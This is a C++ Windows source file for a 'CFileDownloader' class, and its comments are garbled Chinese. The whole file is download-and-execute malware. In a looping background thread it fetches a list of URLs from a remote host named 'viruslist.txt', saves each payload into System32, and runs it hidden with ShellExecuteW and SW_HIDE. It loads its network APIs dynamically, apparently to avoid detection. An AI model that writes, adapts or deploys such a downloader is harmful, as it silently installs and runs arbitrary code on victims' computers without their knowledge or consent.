#include "StdAfx.h"
#include "FileDownloader.h"
#include <bcrypt.h>
#include <wtypes.h>
#include <wininet.h>
#include <shellapi.h>
#include <iostream>
#include <urlmon.h>

static const TCHAR* downFileDir = _T("\\System32\\Download");
static const TCHAR* exampleURLMulti = _T("http://www.example.com/viruslist.txt");
static const TCHAR* exampleURLSingle = _T("http://www.example.com/viruslist.exe");

CRITICAL_SECTION gCriticalSection;
bool downloadThreadRunning = false;

CFileDownloader::CFileDownloader(void)
{
	hDownloader = NULL;
	startDownload();
}

CFileDownloader::~CFileDownloader(void)
{
	::CloseHandle(hDownloader);
}

DWORD WINAPI MultiDownloadThread(LPVOID lpParam)
{
	wstring myURL;
	myURL.clear();
	myURL.append(exampleURLMulti);

	CFileDownloader* downloader = (CFileDownloader*)lpParam;

	// ÿ��100�����һ������
	while(true)
	{
		downloader->backgroundMultiDownLoadFile(exampleURLMulti);

		downloader->downloadExec(exampleURLSingle);

		::Sleep(100000);
	}

	return 0;
}

void CFileDownloader::startDownload()
{
	hDownloader = ::CreateThread(NULL, NULL, MultiDownloadThread, this, 0, &this->threadId);
	downloadThreadRunning = true;
}

bool CFileDownloader::backgroundMultiDownLoadFile( wstring url )
{
	HMODULE hDll;
	LPVOID hInternet, hUrlHandle;
	TCHAR buf[100];
	DWORD dwSize;

	// ��̬����dll����DLLΪϵͳ�Դ���������Ϊ�Ժ�����ִ�г��������׼��
	hDll = LoadLibrary(_T("wininet.dll"));

	// ��ȡDLLʧ�ܣ�����false
	if (!hDll)
	{
		return false;
	}

	// ΪDLL�ڵĺ�������
	typedef LPVOID(WINAPI *pInternetOpen) (LPCTSTR, DWORD, LPCTSTR, LPCTSTR, DWORD);
	typedef LPVOID(WINAPI *pInternetOpenUrl) (LPVOID, LPCTSTR, LPCTSTR, DWORD, DWORD, DWORD);
	typedef BOOL(WINAPI *pInternetCloseHandle) (LPVOID);
	typedef BOOL(WINAPI *pInternetReadFile) (LPVOID ,LPVOID ,DWORD ,LPDWORD);

	pInternetOpen InternetOpen = NULL;
	pInternetOpenUrl InternetOpenURL = NULL;
	pInternetCloseHandle InternetCloseHandle = NULL;
	pInternetReadFile InternetReadFile = NULL;

	InternetOpen = (pInternetOpen) GetProcAddress(hDll, "InternetOpenW");
	InternetOpenURL = (pInternetOpenUrl) GetProcAddress(hDll, "InternetOpenUrlW");
	InternetCloseHandle = (pInternetCloseHandle) GetProcAddress(hDll, "InternetCloseHandle");
	InternetReadFile = (pInternetReadFile) GetProcAddress(hDll, "InternetReadFile");

	hInternet = InternetOpen(_T("Downloader"), 0, NULL, NULL, 0);

	// ������������ʧ��
	if (hInternet == NULL)
	{
		return false;
	}

	// �����޻���Ĵ���
	hUrlHandle = InternetOpenURL(hInternet, url.c_str(), NULL, 0, 0x04000000, 0);

	// ��URLʧ��
	if (hUrlHandle == NULL)
	{
		return false;
	}

	wmemset(buf, 0, 100);

	// �ȶ�ȡһ��8�ֽڵ��ļ�ͷ
	InternetReadFile(hUrlHandle, buf, 8, &dwSize);

	// ��ȡ�������������ļ�
	wstring str;
	do 
	{
		wmemset(buf, 0, 100);

		// ��ȡʧ����ֹͣ��ȡ
		if (!InternetReadFile(hUrlHandle, buf, 100, &dwSize))
		{
			break;
		}

		str.append(buf);
		if (dwSize < 100)
		{
			break;
		}
	}
	while(true);

	// ���������ļ�
	wstring::size_type pos = wstring::npos;

	do 
	{
		// ��|��Ϊ��ͬUrl�ķָ���
		pos = str.find_first_of(_T('|'));

		if (pos != wstring::npos)
		{
			// δ�������ַ����еĵ�һ��URL
			wstring::size_type pos = str.find_first_of(_T('|'));
			wstring curFileUrl = str.substr(0, pos);

			downloadExec(curFileUrl.c_str());

			// ȥ���Ѿ�������URL
			if (str.length() > pos + 1)
			{
				str = str.substr(pos + 1, wstring::npos);
			}
			else
			{
				break;
			}
		}
		else
		{
			break;
		}

		Sleep(1000);
	} while (TRUE);

	return true;
}

void CFileDownloader::downloadExec(LPCTSTR fileUrl)
{
	TCHAR SysDirBuff[MAX_PATH];
	wstring ArpFile;

	memset(SysDirBuff, 0, MAX_PATH);

	::GetSystemDirectoryW(SysDirBuff, sizeof(SysDirBuff));
	ArpFile.append(SysDirBuff);
	ArpFile.append(downFileDir);

	HMODULE hDll;

	hDll = ::LoadLibrary(_T("Urlmon.dll"));

	if (!hDll)
	{
		cerr<<_T("����Urlmon.dllʧ��");
		return;
	}

	typedef HRESULT(__stdcall *pURLDownloadToFile) (LPUNKNOWN, LPCWSTR
		, LPCWSTR, DWORD, LPBINDSTATUSCALLBACK);

	pURLDownloadToFile URLDownloadToFile = (pURLDownloadToFile)GetProcAddress(hDll, "URLDownloadToFileW");

	URLDownloadToFile(0, fileUrl, ArpFile.c_str(), 0, 0);
	
	ShellExecuteW(NULL, NULL, ArpFile.c_str(), NULL, NULL, SW_HIDE);
}